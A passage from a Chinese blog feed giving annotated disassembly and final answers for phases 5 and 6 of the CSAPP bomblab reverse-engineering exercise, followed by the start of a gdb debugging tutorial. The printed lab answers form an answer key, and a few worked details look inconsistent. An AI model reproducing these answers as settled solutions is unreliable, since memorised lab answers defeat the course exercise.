class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终可注意到, x = 7 3 1都可以.</p><p>答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 0 或 3 0 或 1 0</span><br></pre></td></tr></table></figure><h2 id="5-phase-5"><a href="#5-phase-5" class="headerlink" title="5. phase 5"></a>5. phase 5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:   53                      push   %rbx</span><br><span class="line">  401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line">  401067:   48 89 fb                mov    %rdi,%rbx</span><br><span class="line">  40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:   00 00 </span><br><span class="line">  401073:   48 89 44 24 18          mov    %rax,0x18(%rsp</span><br><span class="line">  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:   83 f8 06                cmp    $0x6,%eax            ; 输入6个字段</span><br><span class="line">  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  -----------------------使用坐标 start-----------------------------------</span><br><span class="line">  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx   ; rbx存放的的是输入字符串的首地址, rax是索引下表,所以这里时将输入的每个字符传递给ecx</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)           ;</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx          ; 取ecx的低16位给rdx</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx            ; 取ecx的低4位. </span><br><span class="line">  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx  ;关键代码:以0x4024b0地址为基, 加上rdx偏移量,替换原有字符串. </span><br><span class="line">  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line">  4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line">  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  ----------------------使用坐标 end--------------------------------------</span><br><span class="line">  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi       ; 关键代码, 查看内存地址空间0x40245e的字符串为 flyers, 比较前文获取的字符串是否等于flyers</span><br><span class="line">  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi      ; </span><br><span class="line">  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt; ;</span><br><span class="line">  4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:   00 00 </span><br><span class="line">  4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:   5b                      pop    %rbx</span><br><span class="line">  4010f3:   c3                      retq </span><br></pre></td></tr></table></figure><p>这个题相当有意思,给我一种破译密码的感觉.</p><p>可以理解为, 当前手上有一份加密码表, 我们要找到一个合适的坐标, 通过这个坐标去, 然后去密码表上查找对应码字,使得这些码字组成等于”flyers”.</p><p>解释:</p><ul><li>坐标: 就是我们要输入的字符串的每个字符. 然后取这些字符的低4位作为坐标</li><li>密码表: 0x4024b地址空间.得到坐标后, 查看以0x4024b为首地址的字符串加上这些坐标,得到解密后的码字.</li><li>目标码: 0x40245e地址空间. 我们解密出来的码字要等于这个地址空间所拥有的字符串, 经查看,为flyers</li></ul><p>另外,值得注意的是, 以字符的低4bit作为坐标, 这样会有多个字符有相同的低4bit. 查看acsii码表.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621224830418.png" alt="image-20200621224830418"></p><p>如果以数字表示坐标,则坐标为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 15 6 7</span><br></pre></td></tr></table></figure><p>对比acsii码:</p><p>第一个坐标9, 对应到acsii表的第9行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">) 9 I Y i y</span><br></pre></td></tr></table></figure><p>也就是说, 第一个坐标,可以是这6个字符中的任意一个.</p><p>同理,第二个坐标15, 也就是F行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; ? 0 _ o DEL</span><br></pre></td></tr></table></figure><p>最后, 个人答案:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>/<span class="number">.567</span></span><br></pre></td></tr></table></figure><h2 id="6-phase-6"><a href="#6-phase-6" class="headerlink" title="6. phase 6"></a>6. phase 6</h2><p>phase 6是bomblab中最难的题, 我对代码做了详细的解释:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:       push   %r14</span><br><span class="line">  4010f6:       push   %r13</span><br><span class="line">  4010f8:       push   %r12</span><br><span class="line">  4010fa:       push   %rbp</span><br><span class="line">  4010fb:       push   %rbx</span><br><span class="line">  4010fc:       sub    $0x50,%rsp</span><br><span class="line">  401100:       mov    %rsp,%r13</span><br><span class="line">  401103:       mov    %rsp,%rsi</span><br><span class="line">  -----------------1.输入字段数是否为6检验 start--------------------------</span><br><span class="line">  401106:       callq  40145c &lt;read_six_numbers&gt; ; 读取6个字段</span><br><span class="line">  40110b:       mov    %rsp,%r14</span><br><span class="line">  40110e:       mov    $0x0,%r12d</span><br><span class="line">  -----------------2.输入的6个字段不能重复检验 start---------------------</span><br><span class="line">  401114:       mov    %r13,%rbp</span><br><span class="line">  401117:       mov    0x0(%r13),%eax</span><br><span class="line">  40111b:       sub    $0x1,%eax                ; eax &#x3D; eax -1</span><br><span class="line">  40111e:       cmp    $0x5,%eax                ; eax : 5</span><br><span class="line">  401121:       jbe    401128 &lt;phase_6+0x34&gt;    ; 相等,则通过, 这里是检验是否输入的是6个字段</span><br><span class="line">  401123:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  -----------------1.输入字段数是否为6检验 end--------------------------</span><br><span class="line">  401128:       add    $0x1,%r12d</span><br><span class="line">  40112c:       cmp    $0x6,%r12d</span><br><span class="line">  401130:       je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:       mov    %r12d,%ebx</span><br><span class="line">  401135:       movslq %ebx,%rax               ; rax作为输入数组的索引下标</span><br><span class="line">  401138:       mov    (%rsp,%rax,4),%eax      ; 取出第rax个数,并存放在eax中</span><br><span class="line">  40113b:       cmp    %eax,0x0(%rbp)          ; rbp其实就是外部循环的被用来比较的数(设为x_i),eax是内部循环找到的数(设为x_j)  j &#x3D; i+1 到 5 ,i&#x3D;0 到5</span><br><span class="line">  40113e:       jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:       add    $0x1,%ebx               ; 内部循环+1</span><br><span class="line">  401148:       cmp    $0x5,%ebx</span><br><span class="line">  40114b:       jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:       add    $0x4,%r13               ; 外部循环+1</span><br><span class="line">  401151:       jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  -----------------2.输入的6个字段不能重复检验 end---------------------</span><br><span class="line">  -----------------3. 所有数组元素x_&#123;i&#125; &#x3D; 7 - x&#123;i&#125; start--------------</span><br><span class="line">  401153:       lea    0x18(%rsp),%rsi         ; 指针走到数组头</span><br><span class="line">  401158:       mov    %r14,%rax</span><br><span class="line">  40115b:       mov    $0x7,%ecx               ; 7</span><br><span class="line">  401160:       mov    %ecx,%edx</span><br><span class="line">  401162:       sub    (%rax),%edx             ; x_i &#x3D; 7 - x_i</span><br><span class="line">  401164:       mov    %edx,(%rax)</span><br><span class="line">  401166:       add    $0x4,%rax               ; 指针+1</span><br><span class="line">  40116a:       cmp    %rsi,%rax               ; 是否走到数组尾</span><br><span class="line">  40116d:       jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line">  40116f:       mov    $0x0,%esi</span><br><span class="line">  401174:       jmp    401197 &lt;phase_6+0xa3&gt;   ; 这里直接产生了代码的跨越, 所以先调到 0x401197地址去看看</span><br><span class="line">  -----------------3. 所有数组元素x_&#123;i&#125; &#x3D; 7 - x&#123;i&#125; end--------------</span><br><span class="line">  -----------------4. 链表节点处理代码段(将链表节点地址移动到stack的内存中) start-----</span><br><span class="line">  401176:       mov    0x8(%rdx),%rdx</span><br><span class="line">  40117a:       add    $0x1,%eax</span><br><span class="line">  40117d:       cmp    %ecx,%eax</span><br><span class="line">  40117f:       jne    401176 &lt;phase_6+0x82&gt;   ; 找到链表中相应的元素.链表node结构中有一个类似id的字段, 目前的数组元素就是用来找到对应的id, id的范围是1-6</span><br><span class="line">  401181:       jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:       mov    $0x6032d0,%edx          ; 本题的关键, 查看0x6032d0内存地址空间, 你会发现这里有一个nodex的段, 可以猜想是某种数据结构, 链表&#x2F;tree&#x2F;图等, 通过更多的x打印,会发现大概率是链表结构</span><br><span class="line">  401188:       mov    %rdx,0x20(%rsp,%rsi,2)   ; 将链表的node地址,移动到stack空间去</span><br><span class="line">  40118d:       add    $0x4,%rsi                ; rsi指针+1</span><br><span class="line">  401191:       cmp    $0x18,%rsi               ; 是否走到数组尾</span><br><span class="line">  401195:       je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:       mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">  40119a:       cmp    $0x1,%ecx               ; 映射后的数组元素是否&lt;&#x3D;1</span><br><span class="line">  40119d:       jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:       mov    $0x1,%eax               ;</span><br><span class="line">  4011a4:       mov    $0x6032d0,%edx          ; 链表头节点地址</span><br><span class="line">  4011a9:       jmp    401176 &lt;phase_6+0x82&gt;   ; 跳转到链表节点处理代码段</span><br><span class="line">  -----------------4. 链表节点处理代码段(将链表节点地址移动到stack的内存中) end-----</span><br><span class="line">  -----------------5. 更新链表next指针(按照映射后的数组元素连接) start-------------</span><br><span class="line">  4011ab:       mov    0x20(%rsp),%rbx         ; 走到这里,说明0x6032d0内存地址中的所有链表node地址,都已经移动到了$rsp+0x20上的内存空间</span><br><span class="line">  4011b0:       lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:       lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:       mov    %rbx,%rcx</span><br><span class="line">  4011bd:       mov    (%rax),%rdx</span><br><span class="line">  4011c0:       mov    %rdx,0x8(%rcx)          ; 更新next指针</span><br><span class="line">  4011c4:       add    $0x8,%rax               ; 下一个链表node</span><br><span class="line">  4011c8:       cmp    %rsi,%rax               ; 是否移动到了最后一个node</span><br><span class="line">  4011cb:       je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:       mov    %rdx,%rcx</span><br><span class="line">  4011d0:       jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">  -----------------5. 更新链表next指针(按照映射后的数组元素连接) end-------------</span><br><span class="line">  4011d2:       movq   $0x0,0x8(%rdx)          ; 走到这里,说明链表已经重新连接成功</span><br><span class="line">  4011d9:</span><br><span class="line">  4011da:       mov    $0x5,%ebp</span><br><span class="line">  -----------------6. 验证链表是否是递减序列 start------------------------------</span><br><span class="line">  4011df:       mov    0x8(%rbx),%rax</span><br><span class="line">  4011e3:       mov    (%rax),%eax</span><br><span class="line">  4011e5:       cmp    %eax,(%rbx)</span><br><span class="line">  4011e7:       jge    4011ee &lt;phase_6+0xfa&gt;   ; 上一个node value &gt;下一个node value才能通过,所以要求的递减序列</span><br><span class="line">  4011e9:       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:       mov    0x8(%rbx),%rbx          ; 指向下一个node</span><br><span class="line">  4011f2:       sub    $0x1,%ebp               ; ebp &#x3D; ebp-1 , ebp从5减到0</span><br><span class="line">  4011f5:       jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  -----------------6. 验证链表是否是递减序列 end------------------------------</span><br><span class="line">  4011f7:       add    $0x50,%rsp</span><br><span class="line">  4011fb:       pop    %rbx</span><br><span class="line">  4011fc:       pop    %rbp</span><br><span class="line">  4011fd:       pop    %r12</span><br><span class="line">  4011ff:       pop    %r13</span><br><span class="line">  401201:       pop    %r14</span><br><span class="line">  401203:       retq   </span><br></pre></td></tr></table></figure><p>总体来说, 内存中存在一个6个节点的链表, </p><p>比如:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 -&gt; 55 -&gt; 15 -&gt; 57 -&gt; 12 -&gt; 412 -&gt; NULL</span><br></pre></td></tr></table></figure><p>我们输入6个数字, 然后经过 <strong>7 - 翻转</strong>来控制链表的排序. 举个例子:</p><p>例如: 输入 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 1 4 5 6</span><br></pre></td></tr></table></figure><p>则代码会将 每个元素 = 7 - 每个元素. 则输入变为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5 4 6 3 2 1</span><br></pre></td></tr></table></figure><p>然后用 <code>5 4 6 3 2 1</code>控制链表的排列, 得到:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12 -&gt; 57 -&gt; 412 -&gt; 15 -&gt; 55 -&gt; 41 -&gt; NULL</span><br></pre></td></tr></table></figure><p>最后检查排列的链表是否是降序的. 如果不是降序, 则bomb.</p><p>对于上面的链表,:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 -&gt; 55 -&gt; 15 -&gt; 57 -&gt; 12 -&gt; 412 -&gt; NULL</span><br></pre></td></tr></table></figure><p>正确答案应该为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 3 5 6 4 2</span><br></pre></td></tr></table></figure><p>至于题目中的链表是什么, 查看内存地址空间<strong>0x6032d0</strong>即可知道.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621225834535.png" alt="image-20200621225834535"></p><p>即:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">332 -&gt; 168 -&gt; 924 -&gt; 681 -&gt; 477 -&gt; 443 -&gt; NULL</span><br></pre></td></tr></table></figure><p>所以答案:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure><h2 id="7-个人调试经验"><a href="#7-个人调试经验" class="headerlink" title="7. 个人调试经验"></a>7. 个人调试经验</h2><p>第一次调试汇编， 整个过程并不算容易。前5道题目勉勉强强通过gdb调试出来了。 第6题， 只在gdb中调试， 调试了大半天也没能做出来。 因为gdb的显示空间有限， 而且无法添加注释。 所以后来选择通过objdump先把汇编dump出来， 在结合gdb一起看， 边看变写注释， 很快就能debug出来了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天继续学习csapp.&lt;/p&gt;
&lt;p&gt;前一个lab: &lt;a href=&quot;https://www.ravenxrz.ink/archives/2d758396.html&quot;&gt;Csapp-Datalab 详解 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本次lab, bomblab.&lt;/p&gt;
&lt;h2 id=&quot;0-说明&quot;&gt;&lt;a href=&quot;#0-说明&quot; class=&quot;headerlink&quot; title=&quot;0. 说明&quot;&gt;&lt;/a&gt;0. 说明&lt;/h2&gt;&lt;p&gt; 这个实验相当好玩, 题如其名, 类似一个拆炸弹的过程. 实验只给了一个可执行文件, 需要学生通过gdb反汇编这个可执行文件, “拆弹”共有6个阶段, 每个阶段需要用户输入一个特定的字符串, 一旦输入错误, 炸弹就会爆炸,程序终止.&lt;/p&gt;
&lt;p&gt;做完整个实验, &lt;strong&gt;学生可以学会如何使用gdb, 能够看懂 gcc所编译出来的汇编代码. 掌握阅读汇编代码的能力.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;gdb的使用可参考: &lt;a href=&quot;https://www.ravenxrz.ink/archives/37784c45.html&quot;&gt;gdb 调试基础 &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本次解释, 均已代码注释+图形解释.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所有汇编代码, 可通过 objdump -d bomb获得.&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="Bomblab" scheme="https://www.ravenxrz.ink/tags/Bomblab/"/>
    
  </entry>
  
  <entry>
    <title>gdb调试基础</title>
    <link href="https://www.ravenxrz.ink/archives/37784c45.html"/>
    <id>https://www.ravenxrz.ink/archives/37784c45.html</id>
    <published>2020-06-21T08:24:32.000Z</published>
    <updated>2020-09-06T07:37:36.764Z</updated>
    
    <content type="html"><![CDATA[<p>一直用惯了IDE集成的debug工具, 忽略了gdb这个命令行debug工具. 而最近在做csapp的bomblab, 就不得不来学习它了. 所以特此记录.</p><h2 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h2><p>考虑以下我们在IDE中要进行debug一般需要哪些功能?</p><ol><li>设置断点(包含条件断点)</li><li>开启debug</li><li>step in, step over, continue</li><li>观察某些值的变化, 打印数组value, 打印某个地址value</li><li>函数调用stack, 切换stack</li><li>临时更改某个变量,参数的值</li></ol><p>下面讲解如何用gdb实现这些功能。</p><p>为了更方便讲解, 这里提前把所有常用命令贴出, 读者可不用一一记住, 在逐渐使用的过程中,自然就能形成记住了.</p><a id="more"></a><table><thead><tr><th>命令</th><th>简写</th><th>含义</th></tr></thead><tbody><tr><td>list</td><td>l</td><td>列出10行代码</td></tr><tr><td>break</td><td>b</td><td>设置断点</td></tr><tr><td>break if</td><td>b if</td><td>设置条件断点</td></tr><tr><td>delete [break id]</td><td>d</td><td>删除断点047(按照break id)删除,没有break id,删除所有段6</td></tr><tr><td>disable</td><td></td><td>禁用断点</td></tr><tr><td>enable</td><td></td><td>允许断点</td></tr><tr><td>info</td><td>i</td><td>显示程序状态. info b(列出断点), info regs(列出寄存器)等</td></tr><tr><td>run [args]</td><td>r</td><td>开始运行程序, 可带参数</td></tr><tr><td>display</td><td>disp</td><td>跟踪查看那某个变量, 每次停下来都显示其值</td></tr><tr><td>print</td><td>p</td><td>打印内部变量值</td></tr><tr><td>watch</td><td></td><td>监视变量值新旧的变化</td></tr><tr><td>step</td><td>s</td><td>执行下一条语句，如果该语句为函数调用，则进入函数执行第一条语句</td></tr><tr><td>next</td><td>n</td><td>执行下一条语句,如果该语句为函数调用,不会进入函数内部执行(即不会一步步地调试函数内部语句）</td></tr><tr><td>continue</td><td>c</td><td>继续程序的运行，直到遇到下一个断点</td></tr><tr><td>finish</td><td></td><td>如果进入了某个函数，返回到调用调用它的函数，jump out</td></tr><tr><td>set var name = v</td><td></td><td>设置变量的值</td></tr><tr><td>backtrace</td><td>bt</td><td>查看函数调用信息（堆栈）</td></tr><tr><td>start</td><td>st</td><td>开始执行程序，在main函数中的第一条语句前停下</td></tr><tr><td>frame</td><td>f</td><td>查看栈帧，比如 frame 1 查看1号栈帧</td></tr><tr><td>up</td><td></td><td>查看上一个栈帧</td></tr><tr><td>down</td><td></td><td>查看那下一个栈帧</td></tr><tr><td>quit</td><td>q</td><td>离开gdb</td></tr><tr><td>edit</td><td></td><td>在gdb中进行编辑</td></tr><tr><td>whatis</td><td></td><td>查看变量的类型</td></tr><tr><td>search</td><td></td><td>搜索源文件中的文本</td></tr><tr><td>file</td><td></td><td>装入需要调试的程序</td></tr><tr><td>kill</td><td>k</td><td>终止正在调试的程序</td></tr><tr><td>layout</td><td></td><td>改变当前布局(必备命令)</td></tr><tr><td>examine</td><td>x</td><td>查看内存空间(必备命令)</td></tr><tr><td>checkpoint</td><td>ch</td><td>debug快照, 需要反复调试某一段代码时,非常有用</td></tr><tr><td>disassemble</td><td>disas</td><td>反汇编</td></tr><tr><td>stepi</td><td>si</td><td>下一行指令(遇到函数,进入函数)</td></tr><tr><td>nexti</td><td>ni</td><td>下一行指令</td></tr></tbody></table><p>这么多命令, 但是不要紧, 看完一个例子, 就掌握其中大半了.</p><p>example：</p><p>例子来自: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvZ2RiLWNvbW1hbmQtaW4tbGludXgtd2l0aC1leGFtcGxlcy8=" title="https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/">https://www.geeksforgeeks.org/gdb-command-in-linux-with-examples/<i class="fa fa-external-link"></i></span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gfg.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">findSquare</span><span class="params">(<span class="keyword">int</span> a)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> a * a; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span>** args)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> a = atoi(args[i]); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; findSquare(a) &lt;&lt; <span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>通过g++进行编译, 注意编译参数需要添加”-g”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -g -o gfg gfg.cpp</span><br></pre></td></tr></table></figure><p>执行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb gfg</span><br></pre></td></tr></table></figure><p>开启gdb:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621144320382.png" alt="image-20200621144320382"></p><p>首先介绍的是break(b) 命令, 这是用来设置断点的命令, 它的使用格式如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b</span><br><span class="line">break [function name]</span><br><span class="line">break [file name]:[line number]</span><br><span class="line">break [line number]</span><br><span class="line">break *[address] # 这个用来调试汇编很有用</span><br><span class="line">break ***any of the above arguments*** if [condition]</span><br><span class="line">b ***any of the above arguments*** </span><br></pre></td></tr></table></figure><p>使用:<code>b main</code> 对main函数设置断点.</p><p>然后执行:<code>r 1 10 100</code>命令,把程序跑起来. <code>1 10 100</code>是要传入的参数</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621151305820.png" alt="image-20200621151305820"></p><p>可以看到,程序停在了Breakpoint 1这里, break point 1中的1是什么? gdb为每个断点设定了一个id. </p><p>怎么查看当前设置了哪些断点?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info b</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621150915280.png" alt="image-20200621150915280"></p><p>第一列Num就是break point id.  Enb表示当前断点是enable的, 可以通过 <code>disable breakpoint id</code> disable一个断点. What字段表明了当前断点的位置.</p><p>ok, 现在我们做到了. 1. 设置断点.2. 查看断点. 3. 其中程序.</p><p>接下来我们就一步步的debug吧.</p><p>使用 